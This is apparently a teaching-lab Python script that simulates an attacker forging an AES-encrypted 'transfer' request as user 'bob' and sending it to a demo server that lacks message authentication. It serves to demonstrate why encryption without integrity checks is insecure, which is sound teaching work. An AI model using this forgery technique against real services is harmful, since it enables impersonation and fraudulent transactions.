# stage1_insecure_protocols/3_no_authentication_only/attacker.py

"""
attacker.py - Forged Encrypted Request Without Authentication

This script simulates an attacker who knows the AES encryption key (e.g., due to a leak)
and crafts a forged encrypted message pretending to be a legitimate user.

Vulnerabilities exploited:
- No authentication or signature on encrypted messages
- Server blindly trusts any AES-encrypted payload
- Any party with the shared key can impersonate valid clients

Usage:
    python attacker.py --port 9000
"""

import argparse

from config import DEFAULT_HOST

from utils.aes_utils import encrypt
from utils.attacker_runner import run_tcp_attack

# Parse command-line argument (port)
parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Target server port")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# Forge a malicious transfer request pretending to be user "bob"
fake_plaintext = "username=bob&action=transfer&amount=999999"

# Encrypt the fake request using the known AES key (shared key is assumed leaked)
ciphertext_hex = encrypt(fake_plaintext, return_hex=True)

# Send forged AES-encrypted message to server that lacks authentication checks
response = run_tcp_attack(
    host=server_host,
    port=server_port,
    plain_text=fake_plaintext,
    payload=ciphertext_hex,
    verbose=True
)

print()